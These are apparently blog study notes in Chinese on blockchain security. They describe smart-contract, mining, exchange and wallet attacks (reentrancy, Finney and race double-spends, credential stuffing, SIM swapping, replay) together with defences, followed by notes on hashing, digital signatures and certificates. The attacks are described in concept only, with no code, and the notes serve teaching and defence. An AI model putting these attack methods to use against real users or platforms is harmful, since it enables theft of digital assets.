<p>（2）逻辑漏洞（logic vulnerability）：逻辑漏洞是指由于程序逻辑不严谨，导致逻辑分支被非正常处理或错误处理的漏洞。虚拟机在发现代码不符合规范时，可能会做一些“容错处理”，并导致一些逻辑问题。最典型的是“以太坊短地址攻击”[97]:在ERC-20 TOKEN标准[98]下，攻击者可以输入一个短地址并调用Transfer方法提币。EVM虚拟机在解析合约代码时，会通过末尾填充0的方式将短地址补至预期长度。此时，参数编码可能出现逻辑漏洞，导致攻击者获取与交易金额不符的代币。</p>
<p>（3）资源滥用漏洞（resource-exhaustion vulnerability）：攻击者在虚拟机上部署恶意代码，恶意消耗系统存储资源和计算资源。所以在虚拟机中必须要有相应的限制机制来防止系统的资源被滥用。在以太坊中，智能合约采用了gas机制，攻击者想在以太坊虚拟机上做更多操作，需要付出经济代价。</p>
<p>   合约层攻击的共性在于，攻击者是尝试通过干扰合约的正常调用来实现不同的攻击目的。其特性在于不同攻击方式的攻击目标和原理不同，攻击者可以利用智能合约的代码漏洞或合约虚拟机的运行漏洞，尝试通过非正常的合约调用，以实现非法获利、破坏区块链网络的目的。</p>
<p>   智能合约实质上是由开发者编写并部署在区块链上的一段代码，其中的漏洞可能是由于开发人员编写的代码不符合标准导致的，如整数溢出漏洞、时间戳依赖性、调用深度限制等；也可能是攻击者（开发者）恶意植入的，如重入攻击。所以在智能合约编写过程中，开发人员需考虑到以下几方面。</p>
<p>（1）养成良好的编程习惯，以严谨的编程逻辑避免智能合约开发过程中出现整数溢出等常见的漏洞。</p>
<p>（2）针对智能合约的时间戳依赖性，在合约开发过程中应采用多维参数输入、随机参数输入等，避免合约执行结果完全依赖于时间戳，降低合约执行结果的可预测性。</p>
<p>（3）针对智能合约的调用深度限制，应在智能合约中预先设置预警惩罚机制。当合约调用次数接近上限时，智能合约调用预警合约对用户发出提醒，若用户继续调用合约最终导致合约运行失败，则预警合约调用惩罚合约对最后调用合约的用户进行惩罚。</p>
<p>（4）针对重入漏洞，应在合约开发过程中设置参数检验机制。当智能合约A调用智能合约B时，应对B返回的参数进行确认，再继续执行。参数检验机制可以阻止攻击者通过在B植入漏洞发起重入攻击，也可以阻止攻击者实施误操作异常攻击。</p>
<p>   尽管良好的编程习惯和编程策略可以在一定程度上避免智能合约中出现安全漏洞，但仍有一些安全漏洞是不可避免的。所以在部署智能合约时，用户可以采用以下方法避免代码漏洞带来的危害。</p>
<p> （1）安全评估:在正式部署智能合约前，应对其进行大量安全测试或白盒审计，以评估该合约的安全性。</p>
<p> （2）采用Sereum，ZEUS等重入攻击防护工具。其中，Sereum支持多种重入攻击的识别，不仅适用于待部署合约，还可以保护已部署智能合约在重入攻击下的安全性，误报率仅为0.06%。</p>
<p>   此外，合约虚拟机中存在的逃逸漏洞、逻辑漏洞、资源滥用漏洞可能会导致智能合约的异常运行，攻击者可以在发现这些漏洞后，在与其他用户订立智能合约时，利用这些漏洞编写有利于自己的智能合约代码，使得智能合约失去公平性。所以，区块链网络在引入智能合约虚拟机时，应对虚拟机进行系统的代码审计，分析评估其安全性，并将其可能存在的安全漏洞披露出来。而用户在部署智能合约时，除了对合约代码进行常规审计外，也要根据目标合约虚拟机披露的漏洞对代码进行审计，做好双向的智能合约运行环境评估。</p>
<h3 id="应用层攻击类型分析与防御"><a href="#应用层攻击类型分析与防御" class="headerlink" title="应用层攻击类型分析与防御"></a>应用层攻击类型分析与防御</h3><p>   应用层是区块链技术的应用载体，为各种业务场景提供解决方案。应用层主要有挖矿机制和区块链交易中存在的安全漏洞和恶意攻击。</p>
<p>   挖矿场景中的攻击 。 “挖矿”是维持PoW系统正常运转的动力，很多攻击者尝试利用挖矿过程中存在的漏洞获利，这会导致严重的资源浪费，进而降低区块链网络的吞吐量。其中，主要包括针对矿机系统和挖矿机制的恶意攻击。</p>
<p>   针对矿机系统的攻击 。由于系统代码的闭源特性，用户无法检查矿机的安全性，所以存在诸多安全隐患。</p>
<p> （1） 0day漏洞攻击（zero-day （0day） vulnerability）：目前，大多数矿机的系统都是通用的，一旦某个矿机系统被发现存在0day漏洞，攻击者可以利用该漏洞得到系统控制权限。</p>
<p> （2）网络渗透攻击（network penetration attack）：攻击者通过利用多种安全漏洞对客户端系统（如钱包客户端、矿机系统、Web服务系统等）进行持续性渗透，最终获取系统的控制权限，威胁矿机的系统安全。该攻击方式不限制于某一特定漏洞，最终以获取系统权限为目的。</p>
<p> （3）地址篡改攻击（address tampering attack）：攻击者在攻陷矿机系统之后，通过篡改挖矿奖励接收地址的方式，劫持并盗取原属于目标矿工的挖矿奖励。</p>
<h4 id="资源浪费"><a href="#资源浪费" class="headerlink" title="资源浪费"></a>资源浪费</h4><p>   在挖矿过程中，“聪明”的矿工可能利用挖矿机制的一些漏洞做出趋利行为，导致严重的资源浪费。主要包括:</p>
<p>（1）算力伪造攻击（computational forgery attack）：在比特币系统中，矿池一般通过特定的工作量证明检验算法来检验当前矿工的实际算力。如果算法存在某些漏洞时，“聪明”的矿工可能通过虚报算力来获取更高的奖励，这将严重影响奖励分配的公平性，导致矿池的算力流失。</p>
<p>（2）扣块攻击（block withholding attack）：也被称为藏块攻击。主要有3种形式：第1种是矿池下发计算任务后，恶意矿工直接返回一个错误的计算值，然后分得矿池根据算力分发的数字货币奖励；第2种是矿工挖出区块后，不向矿池返回，而是私自广播至整个网络，独自获得相应的区块奖励；第3种是恶意矿工不会发布自己挖到的区块，导致矿池收益降低。扣块攻击成本较高，恶意矿工获利较少，甚至不获利，所以该攻击常见于矿池恶意竞争的场景中：恶意矿工作为“间谍”加入敌方矿池，在领取敌方矿池奖励的同时，通过浪费敌方矿池的算力资源来获取己方矿池的报酬，实现两方获利。扣块攻击的出现，激化了矿池间的恶意竞争，严重扰乱了正常的挖矿秩序。</p>
<p>（3）丢弃攻击（drop attack）： 攻击者将多个具有良好网络连接的节点置于网络中，这样不但可以方便地获知最新被广播出的区块，也可以比其他节点更加快速地传播目标区块。当攻击者挖出新区块后不会及时公布，直至得知有区块被公布时，攻击者会立即发布自己的区块，并且利用布置好的节点快速地广播到整个网络，使得该合法节点开采的区块被丢弃，从而获取奖励。</p>
<p>（4）空块攻击（empty block attack）： 空块攻击是早期比特币网络中常见的攻击方式，<strong>攻击者通过生成空块获取比打包交易区块更快的出块速度，</strong> 从而以更大的可能性获取出块奖励。空块的产生，<strong>意味着比特币网络有10分钟处于拒绝服务的状态</strong> 。偶尔出现空块不会对网络产生太大影响，但短期内出现大量空块，会使交易池中的交易大量滞留，平均交易时间延长。</p>
<p>（5）通用挖矿攻击（general mining attack）：通用挖矿攻击常见于区块链系统初始化建立的阶段，当该系统与某个已成熟区块链系统采用相同的架构和共识机制时，后者系统中具备大量算力的攻击者可能加入新区块链进行挖矿，以恶意竞争出块奖励。此时容易产生算力集中化问题，甚至当攻击者算力超过新系统全网一半时，可能发起51%攻击来实现代币双花、历史修复、卖空攻击等攻击目的。</p>
<p>（6）交易顺序依赖攻击（transaction-ordering dependence attack）：区块链交易场景中，交易的处理顺序不同，则其产生的结果也不相同。例如：当攻击者发布一个奖励丰富的解题智能合约时，攻击者可以监听网络中与之相关的解题交易，并在目标解题交易被验证、打包上链前，发布一个具备高Gas值的交易，将解题合约的奖励降低为0。出于最大获利的目的，矿工会优先将高Gas值的交易打包上链，导致解题者无法获得智能合约中原先声明的奖励。</p>
<p>（7）芬尼攻击（Finney attack）： 芬尼攻击是扣块攻击的一种衍生攻击，主要发生在支持零确认交易的服务场景中，可以作为实现双花攻击的跳板。以比特币系统为例，每笔交易被打包后需要经过6个区块的确认才能真正上链，这明显无法满足部分服务场景对即时性交易的需求，所以部分商家推出零确认交易服务，即用户在完成交易后无需等待确认便可获取服务，商家则需等待交易数据上链才可以获得相应的费用。攻击者可以利用零确认交易的缺点，实施芬尼攻击：当攻击者挖到包含自己交易A的区块时扣留该区块，然后就A对应的代币与商家完成零确认交易B，并在B被确认前将包含A的区块广播至全网。此时，交易B被验证为不合法，攻击者由此实现了双花攻击。 与通过51%攻击实现的双花攻击相比，芬尼攻击的攻击成本远低于基于51%攻击的双花攻击，因此相对常见。</p>
<p>（8）种族攻击（race attack）： 种族攻击可以看作是一种进阶版的芬尼攻击，可以通过扰乱正常的交易顺序来实现双花攻击。与交易顺序依赖攻击不同的是：交易顺序依赖攻击针对的是智能合约，而种族攻击针对的是支持零确认交易的服务场景。如以太坊中，攻击者在与商家完成零确认交易A后，就A对应的代币生成一个高Gas值的交易B，“聪明”的矿工会优先将B打包进区块以获取最大化的利益，导致零确认交易A验证失败，而攻击者已经提前获取了相应服务，实现了代币双花。</p>
<h3 id="针对交易平台的攻击"><a href="#针对交易平台的攻击" class="headerlink" title="针对交易平台的攻击"></a>针对交易平台的攻击</h3><p>   随着部分国家对比特币的认可，出现了很多区块链数字货币、交易平台，形成了一套相对完整的区块链电子货币金融体系。用户节点可以通过交易平台进行资产转换、投资等商业行为，也可以通过钱包账户进行点对点的可信交易。多样的交易平台和用户账户中存在的安全漏洞，严重威胁着区块链用户的资产安全。</p>
<p>   交易平台是区块链电子货币金融体系中十分重要的一类实体，为区块链用户提供了进行各种商业行为的场所。但由于用户的安全意识不足、系统潜在的安全漏洞等原因，交易平台面临隐私泄露、资产流失的风险。</p>
<p> （1）弱口令攻击（weak password attack）：实际中，用户可能出于方便记忆等原因，为自己的账户设置了安全级别较低的密码，攻击者通过简单的猜测、穷举等方式，即可获取用户的账户访问权限。</p>
<p> （2）撞库攻击（credential stuffing attack）：用户由于安全意识不足，可能在不同的网站使用相同的账号和口令。攻击者可以通过钓鱼攻击等手段收集与区块链、金融等相关网站上的用户账号和口令，然后在目标交易平台上使用自动化程序逐个尝试，以获取该平台中用户的账户隐私信息。</p>
<p> （3）穷举攻击（brute-force attack）：如果网站不对登陆接口做请求限制或者风险控制 ，攻击者可以针对目标值发送多次测试请求，尝试通过穷举攻击破解某些关键信息。如在短信验证中，若平台不对短信验证码的<strong>有效期或验证接口</strong>进行限制， 攻击者可以轻易对其完成破解。若平台对<strong>登陆接口未做请求限制</strong> ，攻击者可以通过大量的密码字典来暴力破解某个账户的密码。</p>
<p> （4） API接口攻击（application programming interface，简称API attack）：用户通常使用私钥key，通过交易平台中私有的API接口来执行一些敏感操作，如交易所新订单的确认、取消等。一旦API key泄露，很可能导致用户账户蒙受经济损失。2018年3月，币安网大量用户API key泄露，攻击者通过泄露的key直接操作用户交易，致一万余枚的比特币被用于购买其他币种，造成币市动荡。</p>
<p> （5）单点登陆漏洞（single sign-on vulnerability）：攻击者可以通过跨站请求伪造、跨站脚本攻击等手段来窃取用户登陆的Ticket，从而盗取目标用户账户中的资金。2017年10月，OKCoin旗下交易所出现大量账户被盗情况，损失金额超过1千万人民币。</p>
<h3 id="针对用户账户的攻击"><a href="#针对用户账户的攻击" class="headerlink" title="针对用户账户的攻击"></a>针对用户账户的攻击</h3><p>   区块链钱包、交易所账户是用户参与区块链交易的重要工具，保管着大量的用户隐私和资产，是攻击者的主要攻击目标。由于服务场景的多样性和复杂性，用户账户主要面临以下安全威胁。</p>
<p>（1）钓鱼攻击（phishing attack）： 攻击者通过伪造网页、系统、邮件等形式，诱导用户进行一系列交易操作，获取用户的钱包、交易所账户口令，进而盗取用户资产。</p>
<p>（2）木马劫持攻击（Trojan horse attack） ：攻击者可以向用户主机中植入木马病毒，通过按键记录、hook浏览器的方式来获取其账户和口令，从而盗取目标用户资产。2017年8月，攻击者利用木马病毒Trickbot对包括Coinbase在内的几家数字货币交易所进行了Web注入攻击[113]，当受害者购买数字货币时，木马病毒会劫持交易所钱包，并将资金定向至攻击者钱包，最终造成用户损失。</p>
<p>（3）中间人劫持攻击（man-in-the-middle attack）： 目前，多数交易所都采用HTTPS协议进行交互，在一定程度上保证了数据安全。但在某些API接口的子域名，却未使用HTTPS。攻击者可以通过在流量中转处劫持网络流量，如路由器、网关等流量出口，从而获取相关信息。</p>
<p>（4）私钥窃取攻击（private key stealing attack）： 用户丢失私钥意味着用户的账户资产全部遗失，因此，用户通常会对钱包的私钥文件进行多次备份，而不安全的备份存放点存在私钥泄露的风险。目前，针对比特币的wallet.dat文件广泛出现在互联网中，例如GitHub、NAS服务器、Web服务等互联网可接入的位置。目前，已经有攻击者开始扫描密钥文件，甚至开发相关的木马病毒进行私钥窃取。</p>
<p>（5）钱包客户端漏洞（wallet client vulnerability）: 攻击者可能利用钱包软件自身的漏洞实施攻击，进而获取用户隐私和资产。例如：在以太坊多重签名钱包Parity中，攻击者可以通过间接调用初始化钱包软件的库函数，将自己更换为受害者钱包的新主人。2017年11月，Parity钱包出现重大Bug，攻击者利用该Bug成为库的主人，然后调用自杀函数报废整个合约库，彻底冻结了150多个地址中总计超过50万个ETH，直接导致上亿美元资金被冻结。</p>
<p>（6）粉尘攻击（dusting attack）： 比特币系统中，“聪”是最小的BTC单位，通常将100聪以内的BTC称为粉尘。而且比特币中没有余额的概念，所有合法的交易都可以追溯到前向一个或多个交易的输出，其源头都是挖矿奖励，末尾则是当前未花费的交易输出（unspent transaction output，简称UTXO）。攻击者可以通过向目标用户钱包地址发送“粉尘”来实施粉尘攻击，当用户使用这些“粉尘”交易时，会导致其与用户自有UTXO的交易输出发生混合，攻击者可以通过“粉尘”来追踪用户的钱包地址，获取用户的隐私信息，从而勒索、盗取目标用户的资产。</p>
<p>（7） SIM hack： 在一些去中心化钱包中，用户需要通过SIM（subscriber identity module）卡来验证身份的合法性。用户通常在丢失SIM卡后向运营商申请“移植”SIM卡，该服务允许客户将该电话号码转移到新的SIM设备中。攻击者可以利用这一漏洞，<strong>通过技术手段将受害者的<strong><strong>SIM</strong></strong>卡移植到他们控制的电话上，然后在其电子邮件帐户上启动密码重置流程，验证码会发送到电话号码中。</strong> 由于攻击者此时控制着SIM卡，可以轻易地对受害者账户信息进行篡改，盗取受害者账户中的财产。</p>
<p>（8）在线钱包窃取（online wallet theft）：目前，很多用户会选择使用在线钱包，这使得个人的资产安全严重依赖于服务商的安全性。2013年11月，比特币在线钱包服务商Inputs.io遭受黑客攻击，黑客通过电子邮件账号进行入侵，进而劫持代管账号，从中盗取了4 100个比特币。</p>
<p>（9）重放攻击（replay attack）:主要包含单链重放攻击和多链重放攻击。单链重放攻击中，攻击者通常在以太坊等账户余额模型的区块链系统中先发起一笔交易A（如交易所提现），然后对A的时间戳等数据进行修改，获得新的交易B并进行广播。因为B的私钥签名和公钥加密齐全，所以矿工会在付款方余额足够的情况下将交易B打包进新区块。攻击者不断重复便可获取大量资金，直至付款方账户余额不足为止。多链重放攻击通常出现在区块链硬分叉时，此时用户的地址和私钥生成算法相同，所有“一条链上的交易在另一条链上也往往是合法的”，所以攻击者在其中一条链上发起的交易后，可以重新将该交易广播到另一条链上，并得到整个系统的确认。</p>
<h3 id="防御策略与方法"><a href="#防御策略与方法" class="headerlink" title="防御策略与方法"></a>防御策略与方法</h3><p>   相比区块链其他层级，应用层攻击的场景更加具体、复杂，所以攻击者的手段也十分多样。因此，区块链应用层面临的安全问题应从实际的服务场景出发，设计合适的防御策略和相关技术。在挖矿场景中，攻击者采用的攻击方式大多具备社会工程学攻击特性，即攻击者会根据矿机漏洞、挖矿机制漏洞采取趋利的挖矿行为，通过损害矿池或其他矿工利益，实现自身利益的最大化。</p>
<p> 针对矿机的系统漏洞 ，可以尝试以下防御策略。</p>
<p> （1）开发阶段:开发人员应在开发阶段设定软件安全开发生命周期，建立安全漏洞管理机制，在成品销售前对矿机系统进行代码审计、性能测试，以预防0day漏洞攻击。</p>
<p> （2）部署阶段:矿工应该在原有的软件防护基础上增加辅助的安全检测技术，如入侵检测、防火墙、蜜罐技术等，进一步预防网络渗透攻击和地址篡改攻击。</p>
<p>   攻击者可以利用挖矿机制 中存在的漏洞恶意骗取、竞争出块奖励，也可以通过扰乱交易顺序实现双花攻击等。其中，算力伪造攻击和扣块攻击 属于恶意骗取矿池出块奖励的攻击行为，可以尝试以下防御策略。</p>
<p> （1）身份管理机制:矿池应结合保证金奖惩机制（如Casper机制）和身份认证机制，对新加入的矿工进行身份认证，要求其缴纳一定的保证金，为其诚实的挖矿行为做保证。</p>
<p> （2）细粒度的工作量检验算法:矿池应定时更新其使用的工作量检验算法，对以往算法中存在的问题进行背书，作为新算法设计的重要依据。</p>
<p> （3）合理的绩效制度:矿池应定时对矿工进行绩效考核，奖励表现优秀的矿工，驱逐效率低下的懒惰矿工。对矿池内的矿工行为进行管理和约束，保证矿池公平有序地运行。</p>
<p> （4）相互监管制度:设置矿工相互监管奖励，一旦矿工因进行算力伪造攻击和扣块攻击而被举报，则矿池奖励举报者，没收恶意矿工的保证金，将其加入黑名单后驱逐出矿池，不再录用。</p>
<p>   丢弃攻击、空块攻击、通用挖矿攻击则属于恶意竞争出块奖励攻击行为。丢弃攻击中，攻击者主要依赖于网络资源优势，可以比其他节点更快获取数据上链信息，也可以更快地完成数据打包上链。所以丢弃攻击可以看作是女巫攻击的变种攻击，也可以作为自私挖矿攻击的前置攻击，提高攻击者实施自私挖矿攻击的成功率。为了防止丢弃攻击，区块链网络可以引入身份认证机制，对用户潜在的节点身份进行关联分析，杜绝单个用户通过操纵多个节点获取远高于其他节点的网络优势。在空块攻击场景中，攻击者之所以可以通过生成空块恶意竞争奖励，是因为区块链网络不存在对新区块的有效性验证过程。因此，区块链网络节点只要在获取新区块时执行有效性验证，即可有效缓解阻止空块攻击。通用挖矿攻击则需要特定的场景才可以实施，其关键在于攻击者利用新系统与旧系统之间相同的架构和共识机制导致的矿机（算力）通用问题，通过成熟系统的中算力对新系统实现算力压制，从而恶意竞争出块奖励，甚至实施双花攻击、卖空攻击等恶意行为。因此，新区块链项目必须考虑系统封闭性、专机专用等问题，从根本上杜绝算力通用导致的通用挖矿攻击。</p>
<p>   芬尼攻击、种族攻击、交易顺序依赖攻击属于扰乱交易顺序类的攻击方式。芬尼攻击和种族攻击主要针对的是支持零确认交易的服务场景，前者主要利用挖矿便利，攻击者只有在挖到包含自己交易的区块时，才会通过零确认交易扰乱交易秩序，实现代币双花等目的；而后者和交易顺序依赖攻击则是通过提高交易Gas的方式扰乱交易顺序，进而实现代币双花等目的。这两者的共性在于区块链节点在接受新区块时未验证区块内交易与交易池中的未确认交易是否存在冲突。由于零确认交易可以满足商家的即时性支付需求，所以直接通过禁止零确认交易来阻止芬尼攻击和种族攻击的方式不具备可行性。区块链系统可以考虑开通钱包的子账户来保证零确认交易的安全性，即，用户需要通过专门的子账户才能完成零确认交易操作。此时，零确认交易由矿工单独打包验证，在一定程度上可以避免零确认交易与普通交易的冲突。此外，为了避免攻击者扰乱交易顺序，区块链系统可以要求矿工在打包交易时，通过代币锁定技术缴纳保证金之后再广播新区块。其他节点在接受新区块时，可以就区块内交易在交易池中进行遍历验证：如果通过验证，则接受新区块；否则，该节点可以通过举报矿工恶意行为来获取矿工被锁定的保证金及出块奖励。</p>
<p>•      八、防御策略与方法</p>
<p>   在区块链交易场景中，攻击者的最终目的是通过直接或间接手段获取用户节点的账户信息，进而盗取资产，主要存在交易平台和用户账户两个攻击目标 。为了保证交易平台中用户的账户隐私，交易平台应采取以下措施。</p>
<p>（1）引入密码安全等级分析机制。系统可以在用户设置账户密码时，对当前密码的安全性进行实时评级，避免用户使用弱口令，从而预防弱口令攻击。</p>
<p>（2）交易平台应在用户登录账号时进行人机识别，在一定程度上缓解撞库攻击。而用户也应该注意避免多网站的密码通用问题，可以考虑对账户进行安全等级评估，相同安全等级的账户采用相同的密码，这样既可以缓解撞库攻击，也能避免账户密码过多给用户带来的密码管理问题。</p>
<p>（3）通过限制目标账户的登陆频率和限制单节点的访问请求频率，从被访问端和访问端两个方向限制攻击者的攻击能力，可以有效预防穷举攻击。</p>
<p>（4）启用API调用接口认证机制，合理管理交易平台的API接口，预防API接口攻击。</p>
<p>（5）提高开发工程师安全素养，在一些敏感系统里单独实现一些额外的认证机制，避免单点登陆漏洞。</p>
<p>   此外，用户在日常交易中应该提高个人的安全意识，采取相应的安全措施，避免在交易过程中泄露了个人账户的隐私数据，具体需要从以下几方面考虑。</p>
<p>（1）培养好安全意识，提高对危险网站、邮件的辨识能力，预防钓鱼攻击。</p>
<p>（2）构建全面的系统安全防护体系，安装防火墙等安全软件，预防木马劫持攻击。</p>
<p>（3）利用安全的路由协议对区块链网络实现全方位覆盖，预防中间人劫持攻击。</p>
<p>（4）实现离线的密钥管理，预防攻击者对在线密钥存储中的私钥窃取。</p>
<p>（5）利用代码审计、逆向漏洞分析、反逆向工程等技术对钱包客户端代码的安全性进行评估。</p>
<p>（6）在使用数字货币钱包时，对一些来源不明的小额资金“粉尘”进行标记并禁用，预防粉尘攻击。</p>
<p>（7）使用专门的零钱包存储该用户持有的“粉尘”级资产，其中既包含攻击者发送的“粉尘”，也可能包含用户自身交易产生的小额资金。为了资产安全，该零钱包中的资金专用于隐私性不高的交易。</p>
<p>•      八、防御策略与方法</p>
<p>   在针对认证机制漏洞的SIM hack攻击场景中，攻击者主要是利用服务商提供的“账户找回”服务中的安全隐患来成功获取目标账户。因为基于手机、邮件的二次验证并不是完全安全的方法，因此服务商应尝试使用采取2FA等具备更高安全性的有更高级别安全设置的服务。2FA是基于时间、历史长度、实物，例如信用卡、SMS手机、令牌、指纹等自然变量结合一定的加密算法组合出的一组动态密码，一般每60s刷新一次。这种方法不容易被破解，相对较安全。</p>
<p>•      八、防御策略与方法</p>
<p>   理论上，基于UTXO结构的区块链系统可以抵抗重放攻击，因为转账是基于每一笔UTXO进行的原子级别操作，不存在一笔UTXO被重复扣除的情况。但是在类似以太坊的账户结构中，交易是通过余额判断合法性的只要余额足够就可以进行重复扣款转账，一笔交易的信息进行多次广播的重放攻击是可行的。交易延展性攻击和重放攻击非常相似，它们都是对交易所发起的攻击方式，但重放攻击主要针对区块链硬分叉的情况，而交易延展性攻击讲究的是区块标识的可变性。</p>
<p>•      八、防御策略与方法</p>
<p>   此外，基于Hyperledger Fabric的区块链也可以抵抗重放攻击，该框架中采用Endorser节点对客户端提交的交易预案进行身份验证，若交易信息异常，则系统终止操作，这种方式可以有效阻止重放攻击。以太坊的账户结构中存在一个参数Nonce，该参数的值等于从这个账户中发出交易的数量。当交易完成验证后，发送者账户中的Nonce值会自动增加1。当矿工验证一笔交易是否合法的时候，矿工会对比交易包含的Nonce值，并与该交易的发送者账户中的Nonce值进行比较，相等才算作合法交易，并对该交易打包出块。单链重放攻击无法修改发送者账户的数值，因此当接受到重复交易时，矿工会直接判定它无效，从而阻止了单链重放攻击。面对多链重放攻击时可以参考以太零开发团队的做法，建立一个交易锁。当一笔交易发起时，交易锁将被广播到整个区块链网络。此时，交易锁会锁定交易关联的数字资产。交易在主节点验证期间，原交易资产被锁定无法使用，以此达到抵御多链重放攻击的目的。</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全基础二</title>
    <url>/2024/11/10/%E9%93%BE%E5%AE%89%E5%9F%BA%E7%A1%802/</url>
    <content><![CDATA[<h2 id="四-数字签名与认证技术"><a href="#四-数字签名与认证技术" class="headerlink" title="四.数字签名与认证技术"></a>四.数字签名与认证技术</h2><h3 id="消息摘要算法："><a href="#消息摘要算法：" class="headerlink" title="消息摘要算法："></a>消息摘要算法：</h3><p>消息摘要是保证明文无法篡改、完整性的一种算法，消息摘要不是加密明文，也不是加密算法</p>
<ul>
<li>无论输入的消息有多长，计算出来的消息摘要的长度总是固定的。</li>
<li>消息摘要看起来是“随机的”。</li>
<li>一般地，只要输入的消息不同，对其进行摘要以后产生的摘要消息也必不相同</li>
<li>消息摘要函数是无陷门的单向函数，即只能进行正向的消息摘要而无法从摘要中恢复出任何的消息</li>
<li>好的摘要算法，没有人能从中找到“碰撞”，虽然“碰撞”是肯定存在的。</li>
</ul>
<h4 id="Hash函数："><a href="#Hash函数：" class="headerlink" title="Hash函数："></a>Hash函数：</h4><h5 id="Hash函数特点："><a href="#Hash函数特点：" class="headerlink" title="Hash函数特点："></a>Hash函数特点：</h5><p>（令h表示哈希函数，h满足以下条件）</p>
<p> 输入可以是任意长度的消息或文件<em>M</em>；</p>
<p> 输出长度是固定的；</p>
<p> 给定<em>h</em>和<em>M</em>，计算<em>h</em>(<em>M</em>)是容易的；</p>
<p> 给定<em>h</em>的描述，找两个不同的消息<em>M</em>1和<em>M</em>2，使得<em>h</em>(<em>M1</em>)<em>&#x3D;h</em>(M2)在计算上是不可行的。 </p>
<p><strong>Hash函数的安全性</strong>：在现有的计算资源下，找到一个碰撞是不可能的。</p>
<p>Hash函数在网络安全应用中，<strong>不仅能用于保护消息或文件的完整性，而且也能用作密码信息的安全存储。</strong></p>
<p>主要Hash算法有MD2、MD4、<strong>MD5、SHA。</strong></p>
<p>其中，MD5能产生128比特长度的哈希值，它的使用广泛，常用于网络中文件的完整性检查。而SHA在美国政府中使用，作为安全哈希标准，SHA产生的哈希值比MD5长，有160比特。 </p>
<h3 id="数字签名："><a href="#数字签名：" class="headerlink" title="数字签名："></a>数字签名：</h3><p>数字签名(Digital Signature)是手写签名的电子模拟，是通过电子信息计算处理，产生的一段特殊字符串消息，该消息具有与手写签名一样的特点，<strong>是可信的、不可伪造的、不可重用的、不可抵赖的以及不可修改的。</strong></p>
<p>数字签名至少应满足以下三个条件：</p>
<p>　　n 签名者事后不能否认自己的签名；</p>
<p>　　n 接收者能验证签名，而任何其他人都不能伪造签名；</p>
<p>　　n当双方就签名的真伪发生争执时，第三方能解决双方之间发生的争执。</p>
<h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>（1）<strong>直接方式的数字签名</strong></p>
<p>​		  直接方式的数字签名只有通信双方参与，并假定接收一方知道发方的公钥。数字签名的形成方式可以用发方的私钥加密信息。 </p>
<p>  直接方式的数字签名有一公共弱点，即方案的有效性取决于发方密钥的安全性。 </p>
<p>（2）<strong>具有仲裁方式的数字签名</strong></p>
<p>​		发方A对发往收方B的信息签名后，将信息及其签名先发给仲裁者C，C对信息及其签名验证完成后，再连同一个表示已通过验证的指令一起发往收方B。此时由于C的存在，A无法对自己发出的信息予以否认</p>
<h4 id="特点-组成："><a href="#特点-组成：" class="headerlink" title="特点&amp;组成："></a>特点&amp;组成：</h4><p>一个数字签名方案一般由签名算法和验证算法组成。<strong>签名</strong>算法的<strong>密钥是秘密的</strong>，只有<strong>签名人掌握</strong>；而<strong>验证算法则是公开的</strong>，以便他人验证。</p>
<p>签名与加密很相似，一般是签名者利用秘密密钥(私钥)对需签名的数据进行加密，验证方利用签名者的公开密钥(公钥)对签名数据做解密运算。<strong>签名与加密的不同之处在于，加密的目的是保护信息不被非授权用户访问，而签名的目的是让消息接收者确信信息的发送者是谁，信息是否被他人篡改。</strong></p>
<h4 id="数字签名基本流程："><a href="#数字签名基本流程：" class="headerlink" title="数字签名基本流程："></a>数字签名基本流程：</h4><p>（熟悉的Alice和Bob又出现了）</p>
<p>假设Alice需要签名<strong>发送一份电子合同文件给Bob</strong>。Alice的签名步骤如下： </p>
<ul>
<li><p>　　第一步，Alice使用Hash函数将电子合同文件生成一个消息摘要。</p>
</li>
<li><p>　　第二步，Alice使用自己的私钥，把消息摘要加密，形成一个数字签名。</p>
</li>
<li><p>　　第三步，Alice把电子合同文件和数字签名一同发送给Bob。</p>
<p> Bob收到Alice发送的电子合同文件及数字签名后，要<strong>验证电子合同文件是Alice所认可</strong>的，验证步骤如下：</p>
</li>
<li><p>​    第一步，Bob使用与Alice相同的Hash算法，计算出所收到电子合同文件的消息摘要。</p>
</li>
<li><p>　第二步，Bob使用Alice的公钥，解密来自Alice的加密消息摘要，恢复出Alice原来的消息摘要。</p>
</li>
<li><p>　第三步，Bob比较自己产生的消息摘要和恢复出来的消息摘要之间的异同。若两个消息摘要相同，则表明电子合同文件来自Alice。如果两个消息摘要的比较结果不一致，则表明电子合同文件已被篡改。</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2024/11/10/Uz16xo34A2vQafu.png" alt="1.png"></p>
<h3 id="数字证书（数字标识）："><a href="#数字证书（数字标识）：" class="headerlink" title="数字证书（数字标识）："></a>数字证书（<strong>数字标识</strong>）：</h3><ul>
<li><p><strong>提供了一种在网络上身份验证的方式，是用来标志和证明网络通信双方身份的数字信息文件</strong>，与司机驾照或日常生活中的身份证相似。</p>
</li>
<li><p>由权威公正的第三方机构即CA中心签发。</p>
</li>
<li><p>以数字证书为核心的加密技术可以对网络上传输的信息进行加密和解密、数字签名和签名验证，确保网上传递信息的机密性、完整性，以及交易实体身份的真实性，签名信息的不可否认性，从而保障网络应用的安全性。</p>
</li>
<li><p>采用公钥密码体制，即利用一对互相匹配的密钥进行加密、解密。通过数字的手段保证加密过程是一个不可逆过程，即只有用私钥才能解密。</p>
</li>
<li><p><strong>使用</strong>：当发送一份保密文件时，发送方使用接收方的公钥对数据加密，而接收方则使用自己的私钥解密</p>
</li>
<li><p>数字证书能够确认以下两点：</p>
<p>  ①保证信息是由签名者自己签名发送的，签名者不能否认或难以否认。</p>
<p>  ②保证信息自签发后到收到为止未曾作过任何修改，签发的文件是真实文件。</p>
</li>
</ul>
<h3 id="认证及认证模型："><a href="#认证及认证模型：" class="headerlink" title="认证及认证模型："></a>认证及认证模型：</h3><p><strong>认证（Authentication）是指核实真实身份的过程，是防止主动攻击的重要技术之一。</strong>计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。</p>
<h4 id="认证的用途"><a href="#认证的用途" class="headerlink" title="认证的用途"></a>认证的用途</h4><p>主要用途有三方面：</p>
<p>（1）验证网络资源访问者的身份，给网络系统访问授权提供支持服务。</p>
<p>（2）验证网络信息的发送者和接收者的真实性，防止假冒。</p>
<p>（3）验证网络信息的完整性，防止篡改、重放或延迟。</p>
